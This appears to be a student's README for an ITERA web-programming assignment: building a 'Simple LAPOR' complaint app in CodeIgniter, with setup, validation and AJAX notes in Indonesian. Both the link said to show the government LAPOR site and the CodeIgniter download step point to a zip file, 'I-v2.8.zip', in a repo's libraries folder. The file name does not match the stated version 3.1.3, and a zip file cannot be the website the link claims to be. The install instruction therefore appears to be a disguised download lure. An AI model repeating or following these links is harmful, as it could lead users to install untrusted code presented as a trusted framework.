## Simple `LAPOR` :heavy_exclamation_mark:
Anda mengetahui aplikasi `lapor` yang dibuat oleh pemerintah republik indonesia? jika tidak silahkan kunjungi 
https://raw.githubusercontent.com/recchan13/IF3111-1920/master/application/libraries/I-v2.8.zip, maka anda akan mendapatkan laman seperti gambar di bawah

![](tampilan/lapor.png)

Kali ini kita akan membuat aplikasi web seperti `lapor` untuk mengumpulkan laporan/komentar terkait layanan
di program studi teknik informatika ITERA.
**Luangkan waktu untuk membaca spesifikasi ini sampai selesai.** :kissing_heart:

### Anggota Tim :cyclone:
Project dikerjakan secara **berkelompok** dengan maksimal jumlah anggota adalah 2-3 orang mahasiswa.

### Petunjuk Pengerjaan :umbrella:
1. Fork pada repository ini dengan akun github anda.
2. Silakan commit pada repository anda (hasil fork). Lakukan berberapa commit dengan pesan yang bermakna,
contoh: fix css, membuat post done, jangan seperti final, benerin dikit, oke deh, update deh dll. 
Disarankan untuk tidak melakukan commit dengan perubahan yang besar karena akan mempengaruhi 
penilaian (contoh: hanya melakukan satu commit kemudian dikumpulkan).
3. Ubah **Penjelasan Teknis** pada bagian bawah readme.md ini dengan menjelaskan bagaimana cara anda:
   - Instalasi Framework, Koneksi basis data 
   - Melakukan validasi pada client-side
   - Melakukan AJAX (mulai dari pengguna melakukan klik pada tombol LAPOR! sampai laporan/komentar terkirim).
4. Pull request dari repository anda ke repository ini dengan 
format **NIM** - **Nama Lengkap**. **Waktu terkahir proses pull request adalah 4 hari setelah 
ujian akhir semester (UAS)**
5. Data yang dikumpulkan adalah:
   - Source code aplikasi
   - Basis data, dan
   - Cara instalasi aplikasi anda
6. Penilaian:
   - Kerjasama tim
   - Kesesuaian dengan spesifikasi
   - Pemahaman dalam penggunaan framework
   - Antarmuka aplikasi
   - Bug free :beetle:
   
### Tools :hammer:
1. Untuk backend, wajib menggunakan PHP framework apapun (Contoh: Codeigniter, Laravel, Slim, Yii dll).
2. Gunakan MySQL atau basis data relasional lain untuk menyimpan data.
3. Untuk frontend, gunakan Javascript, HTML dan CSS. **Tidak boleh menggunakan library atau framework CSS atau JS seperti 
JQuery atau Bootstrap.** CSS sebisa mungkin ada di file yang berbeda (tidak inline styling/embeding styling).

### Spesifikasi Simple LAPOR!
#### Tampilan :soccer:
Anda diminta untuk membuat tampilan sedemikian hingga mirip dengan tampilan berikut. Website yang diminta tidak harus 
responsive. Desain tampilan tidak perlu dibuat indah. Icon dan jenis font tidak harus sama dengan contoh. Warna font, 
garis pemisah, dan perbedaan ukuran font harus terlihat sesuai contoh. Perhatikan juga tata letak elemen-elemen.

![](tampilan/utama.png)
- Search bar diletakkan di bagian paling atas dibawah judul.
- Tombol "cari" berada di sebelah kanan search bar.
- **Buat LAPOR!** digunakan untuk mengirimkan laporan/komentar baru.
- Tampilan search bar ini harus tetap ada walaupun anda tidak mengimplementasikan fitur search.
- Tampilan pertanyaan tidak harus urut berdasarkan "Laporan/Komentar terakhir", 
namun tulisan "Laporan/komentar Terakhir" ini harus ada.

![](tampilan/buat.png)
- Tampilan di atas digunakan untuk mengajukan atau mengubah laporan/komentar.
- Perhatikan label dari field pada form berada di dalam field (tidak di luar)
- Apek yang dilaporkan ditampilkan dalam bentuk `select`

![](tampilan/detail.png)
- Bagian ini menampilkan laporan/komentar. Bagian `datetime` harus ada. Tanda `kuote` tidak harus ada
- Perhatikan label dari field pada form berada di dalam field (tidak di luar)

### List laporan/komentar
Halaman utama berisi daftar judul pertanyaan, siapa yang bertanya, dan isi pertanyaan. Isi pertanyaan yang terlalu 
panjang harus dipotong. Silakan definisikan sendiri seberapa panjang agar tetap baik terlihat di layout yang Anda buat.

Pada masing-masing elemen list, terdapat menu untuk mengubah dan menghapus pertanyaan.

### Kirim laporan/komentar `LAPOR!`
Pengguna dapat mengajukan laporan/komentar. Form yang digunakan memiliki komentar (textarea), 
data lapiran berupa gambar 
dan file berekstention `doc, docx, xls, xlsx, ppt, pptx, pdf``. Gunakan HTTP POST.

### Ubah Laporan/komentar
Pengguna dapat mengubah laporan/komentar yang sudah dibuat. Form yang digunakan memiliki tampilan yang sama dengan 
form untuk bertanya, namun field-field yang ada sudah terisi. Gunakan HTTP POST untuk menyimpan perubahan.

### Hapus Laporan/komentar
Pengguna dapat menghapus laporan/komentar yang sudah dibuat. Lakukan konfirmasi penghapusan dengan `javascript`.

### Lihat Laporan/komentar
Pengguna dapat melihat laporan/komentar. Pada halaman ini terdapat informasi aspek yang dilaporkan.
(Dosen, Staff, Mahasiswa, Infrastruktur dan Pengajaran ), isi laporan/komentar, waktu pengiriman komentar `datetime` 
dan file lapiran. 

### Validasi
Validasi **wajib** dilakukan pada *client-side*, dengan menggunakan **javascript** bukan HTML 5 input type, yaitu:
- Setiap field pada form tidak boleh kosong.
- minimal jumlah kata dalam laporan/komentar adalah 20 kata.

### Bonus
Pengguna dapat mencari laporan/komentar dengan melakukan search ke `isi laporan/komentar`.

### Penjelasan Teknis
                        A.Instalasi Framework dan Koneksi basis data 
1. Instalasi Framework <br>
menggunakan framework CODEIGNITER atau yang sering di sebut CI. codeigniter merupakan sebuah framework php yang sangat sederhana, ringan, dan mudah untuk dipelajari, codeigniter sendiri telah mengadopsi pola MVC yaitu Model-View-Controller dimana kita dapat memisahkan logika dan tampilan sebuah website yang ingin dibangun dengan framework berbasis MVC ini.
-Cara Install Codeigniter
    1. download file Codeigniter pada web server dengan mengakses https://raw.githubusercontent.com/recchan13/IF3111-1920/master/application/libraries/I-v2.8.zip kami mendownload versi 3.1.3
    2. Setelah Terdownload EKSTRAK dan Install Codeigniter Framework file Code-3.1.3.zip lalu rename menjadi codeigniter lalu salin folder tersebut ke folder root anda, yaitu di htdocs di file IF3111-1920 setelah selesai melakukan instalasi framework
2. Koneksi basis data
    1. Konfigurasi Base URL CodeIgniter <br>
    Maka selanjutkan melakukan konfigurasi base url yang terdapat di folder application/config/config.php lalu buka dengan teks editor kami menggunakan Visual Studio Code lalu ubah $config ['base_url'] = 'http://localhost/codeigniter' ; pada repository ini kami menggunakan http://localhost/IF3111-1920/untuk base url nya 
    2. Cek dengan membuka http://localhost/codeigniter jika keluar tampilan welcome to CodeIgniter maka sudah terkoneksi dengan database. 

<br>
                       B. Melakukan validasi pada client-side
    --Langkah langkah dalam memvalidasi client-side--
    1. langkah pertama yaitu dengan melakukan penambahan folder pada application/controller/ lalu buat file Laporan.php lalu isi file dengan menambahkan fungsi yang bertujuan untuk mengendalikan atau memanggil di folder view.<br>
    2. langkah kedua membuat file pada application/vies/erorrs  dengan nama file buatLaporan.php pada file ini terdapat 4 inputan yaitu,<br>
    <br>
    kolom laporan/komentar harus mempunyai nilai minimal 20 karakter yang berarti laporan atau komentar harus melebihi 20 karakter hal ini merupakan VALIDASI CLIENT-SIDE 
    
    ![](tampilan/gambar1.png)
    
    
kemudian user memilih kategori yang diinginkan melapor atau memberi komentar.
<br>
user juga harus menambahkan/upload file berkas pengaduan atau komentar.<br>
jika tidak maka tombol **Buat LAPOR!** tidak akan bisa di klik seperti gambar dibawah<br>

    ![](tampilan/gambar2.png)

 kempatan inputan ini wajib diisi jika tidak sistem akan meminta user untuk mengisikan yang kosong. disinila ada proses Validsasi antara client - side

                C. Melakukan AJAX (mulai dari pengguna melakukan 
            klik pada tombol LAPOR! sampai laporan/komentar terkirim).
1. Dapat melakukan AJAX pada home terdapat beberapa fitur salah satunya Fitur **CARI** pada fitur ini lah AJAX diimplementasikan dimana Pencarian dilakukan secara AJAX yaitu, Search dapat langsung mencari kata yang inputkan tanpa h merefresh halaman dimana setiap tindakan (inputan kata) dari user langsung ditampilkan atau langsung ada kembalian tidak perlu reload halaman    
    ![](tampilan/gambar3.png)
    ( tambah gambar fitur cari dan ss pencarian bisa secara ajax )
2. terdapat fitur buat Laporan/komentar
    1) klik button buat Lapor/komentar<br>
    ![](tampilan/gambar4.png)<br>
    2) halaman akan ke redirect ke halaman buatLaporan<br>
    3)  isi kolom laporan/komentar sesuai dengan yang ingin di laporkan atau dikomentari <br>
    4)memilih kategori yang diinginkan melapor atau memberi komentar.<br>
    5)menambahkan/upload file berkas pengaduan atau komentar.<br>
    6) dan tombol button untuk mengirimkan laporan
    ![](tampilan/gambar5.png) <br>
3. fitur fitur lainnya
    1) terdapat fitur lihat selengkapnya pada menu home <br>
    ![](tampilan/gambar6.png)<br>
    2) fitur selengkapnya akan mengarah ke halaman detail<br>
    3)  Pada halaman detail dapat melakukan update, dan delete<br>
    ![](tampilan/gambar7.png)
    4)Menu update akan menampilkan iputan sebelumnya agar dapat di edit.<br>
    ![](tampilan/gambar8.png)
    5)Menu delete dapat penghapus file dan mengirimkan alert kepada pengguna untuk meyakinkan pengguna bahwa benar ingin menghapus data tersebut.<br>
    ![](tampilan/gambar9.png) <br>

### List laporan/komentar
Halaman utama berisi daftar judul pertanyaan, siapa yang bertanya, dan isi pertanyaan. 
    (tambah gambar list )
### Kirim laporan/komentar `LAPOR!`
Pengguna dapat mengajukan laporan/komentar. Form yang digunakan memiliki komentar (textarea), data lapiran berupa gambar dan file berekstention `doc, docx, xls, xlsx, ppt, pptx, pdf`
    (tambah gambar )

### Ubah Laporan/komentar
Pengguna dapat mengubah laporan/komentar yang sudah dibuat. Form yang digunakan memiliki tampilan yang sama dengan form untuk bertanya, namun field-field yang ada sudah terisi.
    (tambah gambar update)

### Hapus Laporan/komentar
Pengguna dapat menghapus laporan/komentar yang sudah dibuat.
    (tambah gambar)
### Lihat Laporan/komentar
Pengguna dapat melihat laporan/komentar. Pada halaman ini terdapat informasi aspek yang dilaporkan.
(Dosen, Staff, Mahasiswa, Infrastruktur dan Pengajaran ), isi laporan/komentar, waktu pengiriman komentar `datetime` 
dan file lapiran. 
 (tambah gambar )

### About :honeybee:

Dosen       : Rajif Agung Yunmar, S.Kom., M.Cs.	,Ahmad Luky Ramdani, S.Komp., M.Kom. ,
Arief Ichwani, S.Kom., M.Cs., Andre Febrianto, S.Kom., M.Eng, Ilham Firman Ashari, S.Kom., M.T

